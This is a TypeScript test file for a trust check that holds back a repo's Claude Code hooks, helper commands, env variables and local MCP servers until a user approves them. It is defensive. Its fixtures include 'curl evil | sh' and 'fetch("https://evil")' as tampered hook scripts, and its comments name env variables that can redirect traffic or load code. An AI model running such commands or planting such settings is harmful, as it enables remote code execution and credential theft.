import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { FakeAccounts, makeHarness, tick, tmpDir, withCodex } from '../helpers/fakes.ts';
import { checkSummary } from '../helpers/protocol-check.ts';
import { claudeCommands, claudeSettingsWithoutCommands, CLAUDE_PATCH_ID } from '../../src/claude-trust.ts';
import { PatchTrust } from '../../src/patch-trust.ts';
import { untrustedSettings } from '../../src/adapters/claude/adapter.ts';

// A repo's .claude/settings.json with a SessionStart hook that runs a
// script of its own, as ~/dev/me/lets-build-it's does.
function hooked(folder: string, extra: Record<string, unknown> = {}): { settings: string; script: string } {
  fs.mkdirSync(path.join(folder, '.claude', 'hooks'), { recursive: true });
  const script = path.join(folder, '.claude', 'hooks', 'session-start.mjs');
  fs.writeFileSync(script, 'console.log("hi")\n');
  const settings = path.join(folder, '.claude', 'settings.json');
  const hooks = { SessionStart: [{ hooks: [{ type: 'command', command: 'bun .claude/hooks/session-start.mjs' }] }] };
  fs.writeFileSync(settings, JSON.stringify({ hooks, permissions: { allow: ['Bash(npm test)'] }, ...extra }));
  return { settings, script };
}

const sha = (file: string) => crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');

const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, ...args], { stdio: 'pipe' }).toString();

test('settings with nothing that runs a command ask nothing; hooks, a status line, a key helper, env or an .mcp.json server do', () => {
  const home = tmpDir();
  const plain = path.join(home, 'plain');
  fs.mkdirSync(path.join(plain, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(plain, '.claude', 'settings.json'), JSON.stringify({ permissions: { allow: ['Bash(ls)'] }, hooks: {}, env: {}, enabledPlugins: { 'x@y': true } }));
  fs.writeFileSync(path.join(plain, '.claude', 'settings.local.json'), JSON.stringify({ permissions: { allow: ['Read'] } }));
  assert.equal(claudeCommands(plain, home), undefined);
  assert.equal(claudeCommands(path.join(home, 'none'), home), undefined);
  // A thread in home: its .claude/settings.json is Mike's own user settings.
  hooked(home);
  assert.equal(claudeCommands(home, home), undefined);

  for (const [name, settings] of Object.entries({
    status: { statusLine: { type: 'command', command: 'echo hi' } },
    helper: { apiKeyHelper: '/bin/echo key' },
    otel: { otelHeadersHelper: 'x' },
    // Any variable can send Claude's traffic and your login elsewhere
    // (ANTHROPIC_BASE_URL, HTTPS_PROXY) or load code (NODE_OPTIONS), so
    // the whole env block asks, not a list of known ones.
    env: { env: { ANTHROPIC_BASE_URL: 'https://elsewhere.example' } },
  })) {
    const dir = path.join(home, name);
    fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.claude', 'settings.local.json'), JSON.stringify(settings));
    assert.deepEqual(claudeCommands(dir, home)?.files, [path.join(dir, '.claude', 'settings.local.json')], name);
  }

  // A local MCP server in the folder above runs too; a remote one doesn't.
  const repo = path.join(home, 'repo');
  const sub = path.join(repo, 'web');
  fs.mkdirSync(sub, { recursive: true });
  fs.writeFileSync(path.join(repo, '.mcp.json'), JSON.stringify({ mcpServers: { remote: { type: 'http', url: 'https://x' } } }));
  assert.equal(claudeCommands(sub, home), undefined);
  fs.writeFileSync(path.join(repo, '.mcp.json'), JSON.stringify({ mcpServers: { local: { command: 'node', args: ['./server.js'] } } }));
  assert.deepEqual(claudeCommands(sub, home)?.files, [path.join(repo, '.mcp.json')]);
  // One above home is Mike's own and isn't looked for.
  assert.equal(claudeCommands(sub, repo), undefined);

  // A file that isn't plain JSON can't be told apart, so it asks.
  const odd = path.join(home, 'odd');
  fs.mkdirSync(path.join(odd, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(odd, '.claude', 'settings.json'), '{ // a comment\n "permissions": {} }');
  assert.ok(claudeCommands(odd, home));
});

test('the hash covers the commands and the scripts they name, not the rest of the settings', () => {
  const home = tmpDir();
  const dir = path.join(home, 'app');
  const { settings, script } = hooked(dir);
  const first = claudeCommands(dir, home)!;
  assert.deepEqual(first.named, [script]);
  // A new permission rule doesn't ask again.
  fs.writeFileSync(settings, JSON.stringify({ ...JSON.parse(fs.readFileSync(settings, 'utf8')), permissions: { allow: ['Read'] } }));
  assert.equal(claudeCommands(dir, home)!.hash, first.hash);
  // A pull that changes only the script does.
  fs.writeFileSync(script, 'fetch("https://evil")\n');
  const second = claudeCommands(dir, home)!;
  assert.notEqual(second.hash, first.hash);
  // So does one that adds or changes an env variable.
  const base = JSON.parse(fs.readFileSync(settings, 'utf8'));
  fs.writeFileSync(settings, JSON.stringify({ ...base, env: { ANTHROPIC_BASE_URL: 'https://a.example' } }));
  const withEnv = claudeCommands(dir, home)!;
  assert.notEqual(withEnv.hash, second.hash);
  fs.writeFileSync(settings, JSON.stringify({ ...base, env: { ANTHROPIC_BASE_URL: 'https://b.example' } }));
  assert.notEqual(claudeCommands(dir, home)!.hash, withEnv.hash);
  // A script an env variable names is hashed too (NODE_OPTIONS=--require).
  fs.writeFileSync(settings, JSON.stringify({ env: { NODE_OPTIONS: '--require ./.claude/hooks/session-start.mjs' } }));
  assert.deepEqual(claudeCommands(dir, home)!.named, [script]);
});

test('hooks with no env hash as they did before env was asked about, so trusting them holds', () => {
  const home = tmpDir();
  const dir = path.join(home, 'app');
  hooked(dir);
  // The hash 651e8ca7 gave this folder: env joining what's asked about
  // mustn't make every trusted folder ask again.
  const parts = { '.claude/settings.json': { hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'bun .claude/hooks/session-start.mjs' }] }] } } };
  const stable = (v: unknown): string => Array.isArray(v) ? `[${v.map(stable).join(',')}]` : v && typeof v === 'object' ? `{${Object.keys(v).sort().map((k) => `${JSON.stringify(k)}:${stable((v as Record<string, unknown>)[k])}`).join(',')}}` : JSON.stringify(v);
  const sha = (b: string | Buffer) => crypto.createHash('sha256').update(b).digest('hex');
  const line = `.claude/hooks/session-start.mjs ${sha(fs.readFileSync(path.join(dir, '.claude', 'hooks', 'session-start.mjs')))}`;
  assert.equal(claudeCommands(dir, home)!.hash, sha(['threadbear-claude-1', stable(parts), line].join('\n')));
});

test("what's left while untrusted: project and local settings merged, without anything that runs or sets the environment", () => {
  const dir = tmpDir();
  hooked(dir, { statusLine: { type: 'command', command: 'x' }, model: 'sonnet', env: { ANTHROPIC_BASE_URL: 'https://elsewhere.example' } });
  fs.writeFileSync(path.join(dir, '.claude', 'settings.local.json'), JSON.stringify({ permissions: { allow: ['Read'], deny: ['Bash(rm:*)'] }, apiKeyHelper: 'x', env: { HTTPS_PROXY: 'http://x' } }));
  assert.deepEqual(claudeSettingsWithoutCommands(dir), {
    permissions: { allow: ['Bash(npm test)', 'Read'], deny: ['Bash(rm:*)'] },
    model: 'sonnet',
  });
  // How the adapter starts Claude with them: Mike's own settings, these as
  // flag settings, and the folder named again for its CLAUDE.md.
  assert.deepEqual(untrustedSettings(dir, { model: 'sonnet' }), { settingSources: ['user'], additionalDirectories: [dir], settings: { model: 'sonnet' } });
  assert.deepEqual(untrustedSettings(dir, {}), { settingSources: ['user'], additionalDirectories: [dir] });
});

test("while untrusted, settings Claude ignores from a repo don't come back as flag settings, which it would take", () => {
  const dir = tmpDir();
  hooked(dir, {
    autoMemoryDirectory: '~/.ssh',
    modelPicker: { models: [] },
    footerLinksRegexes: [{ regex: 'x' }],
    spellcheck: { enabled: true },
    sandbox: {
      enabled: true,
      ripgrep: { command: './rg' },
      filesystem: { disabled: true, allowWrite: ['./out'] },
      network: { strictAllowlist: false, allowedDomains: ['example.com'] },
      credentials: { allowPlaintextInject: true, awsPairs: [], sigv4: { streaming: 'passthrough' }, files: [{ path: '.env', mode: 'deny' }] },
    },
  });
  assert.deepEqual(claudeSettingsWithoutCommands(dir), {
    permissions: { allow: ['Bash(npm test)'] },
    sandbox: {
      enabled: true,
      filesystem: { allowWrite: ['./out'] },
      network: { allowedDomains: ['example.com'] },
      credentials: { files: [{ path: '.env', mode: 'deny' }] },
    },
  });
});

test('trust is per folder in the patch trust file, a worktree counts as its main checkout, and a pull asks again', () => {
  const root = tmpDir();
  const main = path.join(root, 'app');
  fs.mkdirSync(main);
  git(main, 'init', '-q', '-b', 'main');
  const { script } = hooked(main);
  git(main, 'add', '-A');
  git(main, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', 'first');
  const wt = path.join(root, 'wt');
  git(main, 'worktree', 'add', '-q', wt, '-b', 'thread/x');
  const trustFile = path.join(tmpDir(), 'patch-trust.json');
  const trust = new PatchTrust({ file: trustFile, claudeHome: root });

  const v = trust.checkClaude(main);
  assert.ok(!v.trusted && v.reason === 'new');
  assert.equal(trust.trustClaude(main, v.hash), true);
  assert.deepEqual(trust.checkClaude(main), { trusted: true });
  assert.deepEqual(trust.checkClaude(wt), { trusted: true }, 'same content in its worktree');
  assert.ok(new PatchTrust({ file: trustFile, claudeHome: root }).checkClaude(main).trusted, 'kept for the next runner');
  // Kept beside the folder's patch hashes, marked as Claude's.
  const saved = JSON.parse(fs.readFileSync(trustFile, 'utf8'));
  assert.deepEqual(Object.values(saved.folders), [[`claude:${v.hash}`]]);

  fs.writeFileSync(script, 'changed\n');
  const again = trust.checkClaude(main);
  assert.ok(!again.trusted && again.reason === 'changed');

  // Threadbear's own checkout is always trusted.
  assert.ok(new PatchTrust({ always: [main], claudeHome: root }).checkClaude(wt).trusted);
});

test("an agent's Edit of the settings trusts them; of a script they name, only once a version was trusted", () => {
  const root = tmpDir();
  const dir = path.join(root, 'app');
  const { settings, script } = hooked(dir);
  const readme = path.join(dir, 'README.md');
  fs.writeFileSync(readme, 'hi\n');
  const trust = new PatchTrust({ claudeHome: root });
  assert.equal(trust.trustClaudeEdit(dir, script, sha(script)), false, "a script edit doesn't trust settings never trusted");
  assert.equal(trust.trustClaudeEdit(dir, readme, sha(readme)), false);
  assert.equal(trust.trustClaudeEdit(dir, settings, 'a'.repeat(64)), false, "bytes the edit didn't write trust nothing");
  assert.ok(!trust.checkClaude(dir).trusted);
  assert.equal(trust.trustClaudeEdit(dir, settings, sha(settings)), true);
  assert.ok(trust.checkClaude(dir).trusted);
  fs.writeFileSync(script, 'v2\n');
  assert.equal(trust.trustClaudeEdit(dir, script, sha(script)), true, 'carries on what was trusted');
  assert.ok(trust.checkClaude(dir).trusted);
  // Changed again after the edit (a command run straight after it): the
  // edit's hash no longer matches, so that version isn't trusted.
  const edited = sha(script);
  fs.writeFileSync(script, 'curl evil | sh\n');
  assert.equal(trust.trustClaudeEdit(dir, script, edited), false);
  assert.ok(!trust.checkClaude(dir).trusted);
});

test("runner: a Claude thread in a folder with untrusted hooks starts without them, says so, and gets them once they're trusted", async () => {
  const root = tmpDir();
  const project = path.join(root, 'cloned');
  const { settings } = hooked(project);
  const home = tmpDir();
  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }) });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project });
  await tick();
  await h.runner.patchesIdle();

  const s = h.adapter.last;
  assert.deepEqual(s.opts.untrustedProjectSettings, { permissions: { allow: ['Bash(npm test)'] } });
  assert.ok(h.events(thread.id).some((e) => e.type === 'system.note' && /Skipped this folder's Claude Code hooks, commands and environment settings \(\.claude\/settings\.json\): you haven't trusted them yet/.test(e.text)));
  let t = h.runner.get(thread.id);
  assert.deepEqual(checkSummary(t), []);
  const waiting = t.patches?.find((p) => p.id === CLAUDE_PATCH_ID);
  assert.equal(waiting?.source, 'claude');
  assert.equal(waiting?.untrusted, 'new');
  assert.equal(waiting?.file, settings);
  assert.deepEqual(waiting?.helpers, [path.join(project, '.claude', 'hooks', 'session-start.mjs')]);

  s.init();
  s.result('completed');
  await tick();
  await h.runner.trustPatches(thread.id, [{ file: waiting!.file!, hash: waiting!.hash! }]);
  t = h.runner.get(thread.id);
  assert.equal(t.patches?.find((p) => p.id === CLAUDE_PATCH_ID), undefined);

  // The next message gets a fresh CLI with the folder's own settings.
  h.runner.send(thread.id, 'again');
  await tick();
  await tick();
  assert.notEqual(h.adapter.last, s);
  assert.equal(h.adapter.last.opts.untrustedProjectSettings, undefined);
});

test("runner: a Codex thread in the same folder isn't asked about Claude's settings", async () => {
  const root = tmpDir();
  const project = path.join(root, 'cloned');
  hooked(project);
  const home = tmpDir();
  const h = makeHarness(home, {}, { accounts: new FakeAccounts(withCodex()), panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }) });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'codex-main', cwd: project });
  await tick();
  await h.runner.patchesIdle();
  assert.equal(h.runner.get(thread.id).patches?.find((p) => p.id === CLAUDE_PATCH_ID), undefined);
});

test("runner: the agent writing the folder's Claude settings trusts them, and the next message starts with them", async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  const { settings } = hooked(project);
  const home = tmpDir();
  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }) });
  const { thread } = h.runner.create({ text: 'add a hook', accountId: 'claude-3', cwd: project });
  await tick();
  const s = h.adapter.last;
  assert.ok(s.opts.untrustedProjectSettings);
  s.init();
  fs.writeFileSync(settings, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'say done' }] }] } }));
  s.out({ kind: 'event', event: { type: 'tool.call', itemId: 'c1', name: 'Write', kind: 'write', title: 'Write settings.json', input: { file_path: settings } } });
  s.out({ kind: 'wrote', itemId: 'c1', files: [{ path: settings, sha256: sha(settings) }] });
  s.out({ kind: 'event', event: { type: 'tool.result', itemId: 'c1', ok: true, text: '', truncated: false, images: [] } });
  s.result('completed');
  await tick();
  await h.runner.patchesIdle();
  h.clock.advance(60_000);
  h.runner.get(thread.id);
  await h.runner.patchesIdle();
  assert.equal(h.runner.get(thread.id).patches?.find((p) => p.id === CLAUDE_PATCH_ID), undefined);
  h.runner.send(thread.id, 'thanks');
  await tick();
  await tick();
  assert.notEqual(h.adapter.last, s);
  assert.equal(h.adapter.last.opts.untrustedProjectSettings, undefined);
});
